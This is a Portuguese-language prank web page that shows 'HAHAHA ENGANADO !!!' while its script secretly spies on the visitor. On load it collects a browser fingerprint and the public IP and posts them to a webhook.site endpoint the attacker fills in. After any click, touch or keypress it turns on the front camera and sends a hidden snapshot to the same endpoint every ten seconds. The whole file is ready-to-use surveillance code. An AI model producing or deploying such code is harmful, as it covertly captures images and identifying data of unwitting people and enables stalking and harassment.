<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página</title>
    <style>
        body {
            font-family: sans-serif;
            background-color: #222;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            user-select: none;
            cursor: crosshair;
        }
        .message {
            font-size: 4em;
            font-weight: bold;
            animation: shake 0.5s ease-in-out infinite;
            text-align: center;
            text-shadow: 2px 2px 0px #000;
            z-index: 10;
        }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            20% { transform: translate(-1px, -2px) rotate(-1deg); }
            40% { transform: translate(-3px, 0px) rotate(1deg); }
            60% { transform: translate(3px, 2px) rotate(0deg); }
            80% { transform: translate(1px, -1px) rotate(1deg); }
            100% { transform: translate(1px, 1px) rotate(0deg); }
        }
        .hidden-canvas {
            position: absolute;
            top: -1000px;
            left: -1000px;
        }
        .debug-log {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: rgba(0,0,0,0.8);
            color: #0f0;
            font-family: monospace;
            font-size: 12px;
            padding: 10px;
            box-sizing: border-box;
            max-height: 150px;
            overflow-y: auto;
            z-index: 100;
            display: none; /* Mude para 'block' para depurar */
        }
    </style>
</head>
<body>

    <div class="message">HAHAHA ENGANADO !!!</div>

    <canvas id="camCanvas" class="hidden-canvas"></canvas>
    
    <!-- Console de depuração local (opcional) -->
    <div id="debugConsole" class="debug-log"></div>

    <script>
        // ==========================================================
        // CONFIGURAÇÃO DO PAINEL ADMIN
        // ==========================================================
        // 1. Crie um webhook em https://webhook.site
        // 2. Copie a URL gerada (ex: https://webhook.site/xxxx-xxxx)
        // 3. Cole abaixo
        // Se deixar como 'local', os dados ficarão apenas no console do navegador da vítima
        const ADMIN_ENDPOINT = "https://webhook.site/SUA_URL_AQUI"; 
        
        // ==========================================================
        // FUNÇÕES DE COLETA
        // ==========================================================

        function log(msg) {
            console.log(`[DeepHat]: ${msg}`);
            const el = document.getElementById('debugConsole');
            if (el.style.display === 'block') {
                el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
                el.scrollTop = el.scrollHeight;
            }
        }

        // Gera uma "impressão digital" única do navegador
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillText("DeepHat-Fingerprint-Test", 2, 2);
                return canvas.toDataURL();
            } catch (e) {
                return "Fingerprint_Falha";
            }
        }

        // Coleta todos os dados disponíveis via JavaScript
        function collectData() {
            const data = {
                type: "fingerprint",
                ip_public: "unknown", // Preenchido via API
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen_resolution: `${window.screen.width}x${window.screen.height}`,
                screen_color_depth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                touch_support: "ontouchstart" in window,
                canvas_fingerprint: getCanvasFingerprint(),
                timestamp: new Date().toISOString()
            };
            return data;
        }

        // Envia dados para o painel admin
        async function sendToAdmin(payload) {
            try {
                const res = await fetch(ADMIN_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (res.ok) {
                    log(`Dados enviados com sucesso para Admin. IP: ${payload.ip_public}`);
                } else {
                    log(`Falha no envio. Status: ${res.status}`);
                }
            } catch (error) {
                log(`Erro de rede ao enviar: ${error.message}`);
            }
        }

        // Inicialização: Coleta e Envio
        async function initialize() {
            log("Iniciando coleta de dados...");
            const info = collectData();
            
            // Tenta descobrir o IP público real
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                info.ip_public = ipData.ip;
            } catch (e) {
                info.ip_public = "IP_Local_Somente";
            }

            log(`Fingerprint coletado. User-Agent: ${info.user_agent.substring(0, 50)}...`);
            await sendToAdmin(info);
        }

        // ==========================================================
        // LÓGICA DE CÂMERA OCULTA
        // ==========================================================
        let cameraActive = false;
        let mediaStream = null;

        function tryActivateCamera() {
            if (cameraActive) return;
            cameraActive = true;
            log("Interação detectada. Ativando câmera oculta...");
            
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(stream => {
                    mediaStream = stream;
                    log("Câmera ativada com sucesso.");
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    const canvas = document.getElementById('camCanvas');
                    const ctx = canvas.getContext('2d');
                    
                    // Captura um frame a cada 10 segundos
                    setInterval(() => {
                        if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0);
                            
                            // Converte para Base64 (JPEG)
                            const imgData = canvas.toDataURL('image/jpeg', 0.7);
                            
                            // Envia a foto
                            const payload = {
                                type: "camera_capture",
                                image: imgData,
                                timestamp: new Date().toISOString()
                            };
                            sendToAdmin(payload);
                            log("Frame de câmera capturado e enviado.");
                        }
                    }, 10000); // 10 segundos
                })
                .catch(err => {
                    log("Câmera negada ou indisponível: " + err.message);
                });
            } else {
                log("Navegador não suporta getUserMedia.");
            }
        }

        // Adiciona listeners para qualquer tipo de interação
        document.addEventListener('click', tryActivateCamera);
        document.addEventListener('touchstart', tryActivateCamera);
        document.addEventListener('keydown', tryActivateCamera);

        // Inicia quando a página carregar
        window.onload = () => {
            initialize();
        };
    </script>
</body>
</html>
